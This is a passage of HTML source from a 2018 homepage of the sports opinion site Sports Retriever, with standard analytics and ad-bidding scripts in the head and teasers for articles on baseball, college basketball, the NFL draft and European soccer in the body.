<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" type="image/png"
	      href="http://sportsretriever.com/wp-content/themes/sportsretriver/favicon.png"/>


	<title>Sports Retriever - The Best Sports Stories In The World</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Sports Retriever is the leading destination for human interest and opinion sports stories."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://sportsretriever.com/" />
<link rel="next" href="http://sportsretriever.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Sports Retriever - The Best Sports Stories In The World" />
<meta property="og:description" content="Sports Retriever is the leading destination for human interest and opinion sports stories." />
<meta property="og:url" content="http://sportsretriever.com/" />
<meta property="og:site_name" content="Sports Retriever" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Sports Retriever is the leading destination for human interest and opinion sports stories." />
<meta name="twitter:title" content="Sports Retriever - The Best Sports Stories In The World" />
<meta name="twitter:site" content="@sportsretriever" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/sportsretriever.com\/","name":"Sports Retriever","potentialAction":{"@type":"SearchAction","target":"http:\/\/sportsretriever.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Sports Retriever &raquo; Feed" href="http://sportsretriever.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sports Retriever &raquo; Comments Feed" href="http://sportsretriever.com/comments/feed/" />
<link rel='stylesheet' id='SportsRetriver-style-main-css'  href='http://sportsretriever.com/wp-content/themes/sportsretriver/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='SportsRetriver-style-css'  href='http://sportsretriever.com/wp-content/themes/sportsretriver/style.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://sportsretriever.com/wp-content/themes/sportsretriver/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://sportsretriever.com/wp-content/themes/sportsretriver/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://sportsretriever.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://sportsretriever.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://sportsretriever.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-92681211-2', 'auto');
  ga('send', 'pageview');

</script>

<script type="text/javascript" src="http://d1rlca3pqma1yp.cloudfront.net/abdetector.js"></script> 

<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '766727303483012'); // Insert your pixel ID here.
fbq('track', 'PageView');
  
function adBlockUndetected () {
    window.usingAdBlock = false
    window._fbq.push(['track', 'NotUsingAdBlocker', {}])
  }

  function adBlockDetected () {
    window.usingAdBlock = true
    window._fbq.push(['track', 'UsingAdBlocker', {}])
  }

  if (typeof window.adBlockDetector === 'undefined') {
    adBlockDetected()
  } else {
    window.adBlockDetector
      .on(true, adBlockDetected)
      .on(false, adBlockUndetected)
  }
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=766727303483012&ev=PageView&noscript=1"
/></noscript>
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<script type="text/javascript">
  var taboola_account = 'sportsretriever';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'mt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'mf';
    }
    else {
      taboola_account += 'mr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'dt';
    }
    else {
      taboola_account += 'dr';
    }
  }
  else if (taboola_platform == 'tablet') {
      taboola_account += 't';
  }
  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<!-- Quantcast Tag -->
<script type="text/javascript">
var _qevents = _qevents || [];

(function() {
var elem = document.createElement('script');
elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
elem.async = true;
elem.type = "text/javascript";
var scpt = document.getElementsByTagName('script')[0];
scpt.parentNode.insertBefore(elem, scpt);
})();

_qevents.push({
qacct:"p-WuwXFmpb6NT-T"
});
</script>

<noscript>
<div style="display:none;">
<img src="//pixel.quantserve.com/pixel/p-WuwXFmpb6NT-T.gif" border="0" height="1" width="1" alt="Quantcast"/>
</div>
</noscript>
<!-- End Quantcast tag --><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0;}}};</script>
	<script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/SR/prebid.js" async></script>

	<script>
		var googletag = googletag || {};
		googletag.cmd = googletag.cmd || [];
		googletag.cmd.push(function() {
			googletag.pubads().disableInitialLoad();
			googletag.pubads().collapseEmptyDivs(true);
			googletag.pubads().setTargeting("pageNumber", String(getPageNumber()))
		});

		
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: 'fdfe766b-720a-47cd-93c0-6f0d7de9f59a', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/180397799/sr-desktop-low',  sizes: [[728, 90]], slotID: 'ad_pos_sr-desktop-low'},
                        {slotName: '/180397799/sr-desktop-top',  sizes: [[728, 90]], slotID: 'ad_pos_sr-desktop-top'},
                        {slotName: '/180397799/sr-rr-atf',  sizes: [[300, 250]], slotID: 'ad_pos_sr-rr-atf'},
                        {slotName: '/180397799/sr-rr-btf',  sizes: [[300, 250]], slotID: 'ad_pos_sr-rr-btf'},
                        {slotName: '/180397799/sr-rr-mid',  sizes: [[300, 600], [300, 250]], slotID: 'ad_pos_sr-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        
		pbjs.que.push(function() {
			pbjs.setPriceGranularity({
				"buckets" : [{
					"precision": 2,
					"min" : 0,
					"max" : 3,
					"increment" : 0.01
				},
					{
						"precision": 2,
						"min" : 3,
						"max" : 5,
						"increment" : 0.05
					},
					{
						"precision": 2,
						"min" : 5,
						"max" : 10,
						"increment" : 0.1
					},
					{
						"precision": 2,
						"min" : 10,
						"max" : 30,
						"increment" : 0.5
					}]
			});
			pbjs.addAdUnits(adUnits);
			pbjs.requestBids({
				bidsBackHandler: sendAdserverRequest
			});
		});

		pbjs.que.push(function() {
			pbjs.enableAnalytics({
				provider: 'cmv2'
			});
		});


		function sendAdserverRequest() {
			if (pbjs.adserverRequestSent) return;
			pbjs.adserverRequestSent = true;
			googletag.cmd.push(function() {
				pbjs.que.push(function() {
					pbjs.setTargetingForGPTAsync();
					googletag.pubads().refresh();
				});
			});
		}

		setTimeout(function() {
			sendAdserverRequest();
		}, PREBID_TIMEOUT);



	</script>

	<script>
		(function () {
			var gads = document.createElement('script');
			gads.async = true;
			gads.type = 'text/javascript';
			var useSSL = 'https:' == document.location.protocol;
			gads.src = (useSSL ? 'https:' : 'http:') +
				'//www.googletagservices.com/tag/js/gpt.js';
			var node = document.getElementsByTagName('script')[0];
			node.parentNode.insertBefore(gads, node);
		})();
	</script>

	<script>
		googletag.cmd.push(function () {
			
				googletag.defineSlot('/180397799/sr-desktop-top', [728, 90], 'ad_pos_sr-desktop-top').addService(googletag.pubads());
				googletag.defineOutOfPageSlot('/180397799/sr-edge', 'ad_pos_sr-edge').addService(googletag.pubads());
	//			googletag.defineSlot('/180397799/sr-eof-top', [[468, 60], [300, 250], [728, 90]], 'ad_pos_sr-').addService(googletag.pubads());
				googletag.defineSlot('/180397799/sr-rr-atf', [300, 250], 'ad_pos_sr-rr-atf').addService(googletag.pubads());
				googletag.defineSlot('/180397799/sr-rr-btf', [300, 250], 'ad_pos_sr-rr-btf').addService(googletag.pubads());
				googletag.defineSlot('/180397799/sr-rr-mid', [[300, 600], [300, 250]], 'ad_pos_sr-rr-mid').addService(googletag.pubads());
			
			googletag.pubads().enableSingleRequest();
			googletag.enableServices();


		});
	</script>

</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>
<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->

<header id="top_header" class="navbar-fixed-top">
	<nav class="navbar navbar-default" id="top_nav">
		<div class="container">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed"
				        data-toggle="collapse" data-target="#navbar-collapse-1"
				        aria-expanded="false" aria-controls="navbar-collapse-1">
					<span class="sr-only">Toggle navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<a class="navbar-brand" href="http://sportsretriever.com">
											<img
							src="http://sportsretriever.com/wp-content/themes/sportsretriver/images/logo.png"
							alt="Sports Retriever"
							class="logo-image img-responsive">
									</a>
			</div>
			<!-- Collect the nav links, forms, and other content for toggling -->
			<div class="collapse navbar-collapse navbar-left"
			     id="navbar-collapse-1">
				<div class="flex-wrap">
					<ul id="menu-main-menu" class="nav navbar-nav"><li id="menu-item-835" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-835"><a title="Baseball" href="http://sportsretriever.com/category/baseball/">Baseball</a></li>
<li id="menu-item-836" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-836"><a title="Basketball" href="http://sportsretriever.com/category/basketball/">Basketball</a></li>
<li id="menu-item-837" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-837"><a title="Football" href="http://sportsretriever.com/category/football/">Football</a></li>
<li id="menu-item-838" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-838"><a title="Hockey" href="http://sportsretriever.com/category/hockey/">Hockey</a></li>
<li id="menu-item-839" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-839"><a title="Soccer" href="http://sportsretriever.com/category/soccer/">Soccer</a></li>
<li id="menu-item-840" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-840"><a title="Stories" href="http://sportsretriever.com/category/stories/">Stories</a></li>
<li id="menu-item-841" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-841"><a title="Tennis" href="http://sportsretriever.com/category/tennis/">Tennis</a></li>
</ul>				</div>
			</div><!-- /.navbar-collapse -->
			<div class="flex-wrap navbar-right" id="top_nav__social">
				<ul class="top_nav__social_link list-inline">
					<li>
						<a href="https://twitter.com/SportsRetriever/" target="_blank" class="top_social_link">
							<span class="icon icon-twitter"></span>
						</a>
					</li>
					<li>
						<a href="https://facebook.com/sportsretriever/" target="_blank" class="top_social_link">
							<span class="icon icon-facebook"></span>
						</a>
					</li>
				</ul>
			</div>
		</div>
	</nav>
</header>

<main id="main_content">
	<div id="banner">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
										<article class="banner_item">
							<a href="http://sportsretriever.com/baseball/eight-rookie-debuts-every-mlb-fan-should-look-forward-to-this-season/"
							   class="banner_item_wrap">
								<div class="banner_images_wrap">
									<div class="banner_item_img"
									     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/13130244/Ronald-Acuna.jpg')"></div>
									<div class="banner_item_img"
									     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/13130241/Victor-Robles-433x460.jpg')"></div>
									<div class="banner_item_img"
									     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/13130238/Willie-Calhoun.jpg')"></div>
								</div>
								<div class="banner_item_text_wrap">
									<p class="banner_item_category">Baseball</p>
									<h2 class="banner_item_header">Eight rookie debuts every MLB fan should look forward to this season										<span
											class="icon icon-right_arrow"></span>
									</h2>
									<p class="banner_item_meta">
										by
										<span
											class="banner_item_meta_author">Travis Pulver</span>
										-
										<span
											class="banner_item_meta_date">Mar 22, 2018</span>
									</p>
								</div>
							</a>
						</article>
						
			</div>
		</div>
	</div>
</div>
	<div id="block_under_banner">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="block_under_banner_posts_wrap">
					<div
						class="block_under_banner_post block_under_banner_social">
						<div class="block_under_banner_social_wrap">
	<div class="td_block_social_counter td-pb-border-top">
		<a href="https://facebook.com/sportsretriever/" target="_blank" class="td_social_type td_social_facebook">
			<div class="td_social_icon_wrap">
				<div class="icon icon-facebook-social"></div>
			</div>
			<span class="td_social_info"></span>
			<span class="td_social_info_name"></span>
			<span class="td_social_button">Like</span>
		</a>
		<a href="https://twitter.com/SportsRetriever/" target="_blank" class="td_social_type td_social_twitter">
			<div class="td_social_icon_wrap">
				<div class="icon icon-twitter-social"></div>
			</div>

			<span class="td_social_info"></span>
			<span class="td_social_info_name"></span>
			<span class="td_social_button">Follow</span>
		</a>
	</div>
</div>
					</div>
					<div
						class="block_under_banner_post block_under_banner_post_first">
						
		<a href="http://sportsretriever.com/baseball/david-wright-just-retire-already/"
		   class="block_under_banner_post_wrap block_under_banner_post_first_wrap">
			<div class="block_under_banner_img_wrap">
				<div class="block_under_banner_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/13133905/david-wright-425x110.jpg')"></div>
			</div>
			<div class="block_under_banner_text_wrap">
				<h2 class="block_under_banner_header">Should David Wright just retire already?</h2>
			</div>
		</a>
		
					</div>
					<div
						class="block_under_banner_post block_under_banner_post_second hidden-xs hidden-sm">
								<a href="http://sportsretriever.com/basketball/should-boston-celtics-hold-gordon-hayward-out-if-he-gets-cleared/"
		   class="block_under_banner_post_wrap block_under_banner_post_second_wrap">
			<div class="block_under_banner_img_wrap">
				<div class="block_under_banner_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/18125044/gordon-hayward-2-425x110.jpg')"></div>
			</div>
			<div class="block_under_banner_text_wrap">
				<h2 class="block_under_banner_header">Should the Celtics hold Hayward out if he is cleared to play this season?</h2>
			</div>
		</a>
		
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
	<div id="three_blocks">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="three_blocks_wrap">
					<div class="row">
														<div class="col-sm-12 col-md-4">
									<a href="http://sportsretriever.com/basketball/previewing-shocking-sweet-16/"
									   class="three_blocks_item">
										<div class="three_blocks_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/19102210/michigan-buzzer-beater-390x240.jpg')"></div>
										<div class="three_blocks_item_content">
											<p
												class="three_blocks_item_content_category">Basketball</p>
											<h2 class="three_blocks_item_content_header">Previewing A Shocking Sweet 16</h2>
											<p class="three_blocks_item_content_meta">
												By David Schwartz</p>
											<p
												class="three_blocks_item_content_text">





There are going to be takes that suggest we just witnessed the best or craziest first weekend in NCAA Tournament history. They’re hard to...</p>
										</div>
									</a>
								</div>
																<div class="col-sm-12 col-md-4">
									<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-march-18-24/"
									   class="three_blocks_item">
										<div class="three_blocks_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/19094120/jordan-and-pippen-1995-390x240.jpg')"></div>
										<div class="three_blocks_item_content">
											<p
												class="three_blocks_item_content_category">Stories</p>
											<h2 class="three_blocks_item_content_header">Looking back: this week in sports history March 18 &#8211; 24</h2>
											<p class="three_blocks_item_content_meta">
												By Lela Ordinaev</p>
											<p
												class="three_blocks_item_content_text">





March 18, 1945: Back in 1945, the NHL season was coming to an end in mid-March, and it would end with an historic feat. On March 18th of...</p>
										</div>
									</a>
								</div>
																<div class="col-sm-12 col-md-4">
									<a href="http://sportsretriever.com/football/lamar-jackson-shouldnt-get-upset-teams-want-workout-wide-receiver/"
									   class="three_blocks_item">
										<div class="three_blocks_item_img"
										     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/14101149/lamar-jackson-3-390x240.jpg')"></div>
										<div class="three_blocks_item_content">
											<p
												class="three_blocks_item_content_category">Football</p>
											<h2 class="three_blocks_item_content_header">Lamar Jackson shouldn’t be too upset if teams want him to workout at wide receiver</h2>
											<p class="three_blocks_item_content_meta">
												By Travis Pulver</p>
											<p
												class="three_blocks_item_content_text">







It is not unusual to see Lamar Jackson’s name in the headlines of sports pages and blogs all over the internet. Since he exploded...</p>
										</div>
									</a>
								</div>
													</div>
				</div>
			</div>
		</div>
	</div>
</div>
	<div class="container hidden-more-tab-land hidden-lg">
	<div class="row">
		<div class="col-xs-12">
			<div id="place_ads_mob">
				<div class="place_ads_mob_first" style="text-align: center;">
  <!-- BEGIN JS TAG - SR D RR-ATF US < - DO NOT MODIFY -->
  <SCRIPT SRC="http://ads.pubsqrd.com/ttj?id=11561452&size=300x250" TYPE="text/javascript"></SCRIPT>
  <!-- END TAG -->
</div>
				<div class="place_ads_mob_second hidden-xs">
  <a href="./"><img src="http://sportsretriever.com/wp-content/themes/sportsretriver/images/img/ads_2.png" alt=""></a>
</div>
			</div>
		</div>
	</div>
</div>
	<div class="container">
	<div class="row">
		<div
			class="col-xs-12 col-sm-12 col-md-8 home_main_section main_section">
			<div class="whats_new">
	<h2 class="home_header">What's new?</h2>
	<div class="main_section_items_wrap">
										<a href="http://sportsretriever.com/soccer/manchester-united-still-big-club/" class="main_section_item">
				<div class="main_section_item_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/18081411/manchester-united-sevilla-390x240.jpg')"></div>
				<div class="main_section_item_content">
					<h2 class="main_section_item_content_header">Is Manchester United still a big club?</h2>
					<p class="main_section_item_content_meta">By Jonathan Regev</p>
					<p class="main_section_item_content_text">







Two big clubs played this week in the Champions League. Barcelona and Manchester United both came home for the second leg following a...</p>
					<p class="main_section_read_more hidden-xs hidden-sm">Read More</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/football/eight-college-football-players-watch-2018/" class="main_section_item">
				<div class="main_section_item_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/06113421/Dwayne-Haskins-2-390x240.jpg')"></div>
				<div class="main_section_item_content">
					<h2 class="main_section_item_content_header">Eight players ready to take over college football in 2018</h2>
					<p class="main_section_item_content_meta">By Travis Pulver</p>
					<p class="main_section_item_content_text">




As the latest group of college superstars go under the spotlight ahead of the NFL draft, it is not hard to wonder who is going to be next....</p>
					<p class="main_section_read_more hidden-xs hidden-sm">Read More</p>
				</div>
			</a>
			</div>
	<div class="ads-728x90 hidden-xs hidden-sm">
	<!-- BEGIN JS TAG - SR D Floor US < - DO NOT MODIFY -->
	<SCRIPT SRC="http://ads.pubsqrd.com/ttj?id=11561465&size=728x90" TYPE="text/javascript"></SCRIPT>
	<!-- END TAG -->
</div>
	<div class="main_section_items_wrap">
										<a href="http://sportsretriever.com/stories/wrestling-mothering-becoming-mainstream/" class="main_section_item">
				<div class="main_section_item_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/06105810/brie-bella-and-husband-390x240.jpg')"></div>
				<div class="main_section_item_content">
					<h2 class="main_section_item_content_header">Wrestling while mothering, it&#8217;s becoming more mainstream</h2>
					<p class="main_section_item_content_meta">By Scarlett Harris</p>
					<p class="main_section_item_content_text">





World Wrestling Entertainment’s Royal Rumble event at the end of January not only marked the first ever women’s Rumble match, wherein 30...</p>
					<p class="main_section_read_more hidden-xs hidden-sm">Read More</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/basketball/last-minute-ncaa-tournament-predictions/" class="main_section_item">
				<div class="main_section_item_img"
				     style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/15080552/loyola-chicago-basketball-390x240.jpeg')"></div>
				<div class="main_section_item_content">
					<h2 class="main_section_item_content_header">Our last minute NCAA Tournament predictions</h2>
					<p class="main_section_item_content_meta">By Merav Savir</p>
					<p class="main_section_item_content_text">




Welcome to the best Thursday of the year. We’re just a few hours away from the official NCAA Tournament tip off, which begins with freshman...</p>
					<p class="main_section_read_more hidden-xs hidden-sm">Read More</p>
				</div>
			</a>
			</div>

</div>
			<div class="row ">
	<div class="col-xs-12 hot_stories_wrap">
		<h2 class="home_header">Hot stories</h2>
		<div class="row hot_stories_row">
			<div class="col-sm-12 col-md-6 hot_stories">
	
<div class="hot_stories_big_item_wrap">
										<a href="http://sportsretriever.com/football/someone-should-hurry-up-and-sign-johnny-manziel/" class="hot_stories_big_item">
				<div class="hot_stories_big_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/12103115/johnny-manziel-3-390x240.jpg')"></div>
				<div class="hot_stories_big_item_content">
					<p class="hot_stories_big_item_meta">Football</p>
					<h2 class="hot_stories_big_item_header">Someone should hurry up and sign Johnny Manziel</h2>
				</div>
			</a>
			
</div>
	<div class="hot_stories_small_items_wrap">
										<a href="http://sportsretriever.com/soccer/tradition-took-center-stage-round-16-champions-league-matches/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/11094933/juventus.jpg')"></div>
				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">Tradition took center stage in these Round of 16 Champions League matches</h2>
					<p class="hot_stories_small_item_meta">Mar 13, 2018</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/baseball/top-five-teams-that-have-a-shot-at-ending-their-world-series-drought/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/04113304/milwaukee-brewers-168x120.jpg')"></div>
				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">Top 5 teams that have a shot at ending their World Series drought</h2>
					<p class="hot_stories_small_item_meta">Mar 13, 2018</p>
				</div>
			</a>
												<a href="http://sportsretriever.com/basketball/brackets-selection-sunday-recap/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/12122210/trae-young-51-168x120.jpg')"></div>
				<div class="hot_stories_small_item_content">
					<h2 class="hot_stories_small_item_header">The brackets are here: Selection Sunday recap</h2>
					<p class="hot_stories_small_item_meta">Mar 12, 2018</p>
				</div>
			</a>
			</div>
</div>
			<div class="col-sm-12 col-md-6 hot_stories">
	
<div class="hot_stories_big_item_wrap">
										<a href="http://sportsretriever.com/stories/looking-back-week-sports-history-march-11-17/" class="hot_stories_big_item">
				<div class="hot_stories_big_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/12095630/six-overtime-game-1-390x240.jpg')"></div>
				<div class="hot_stories_big_item_content">
					<p class="hot_stories_big_item_meta">Stories</p>
					<h2 class="hot_stories_big_item_header">Looking back: this week in sports history March 11 &#8211; 17</h2>
				</div>
			</a>
			
</div>
	<div class="hot_stories_small_items_wrap">
										<a href="http://sportsretriever.com/soccer/psg-cant-buy-champions-league/" class="hot_stories_small_item">
				<div class="hot_stories_small_item_img" style="background-image: url('http://d219s82bmpe0qh.cloudfront.net/wp-content/uploads/2018/03/11092637/Nasser-Al-Khelaifi-and-Mbappe-168x120.jpg')"></div>
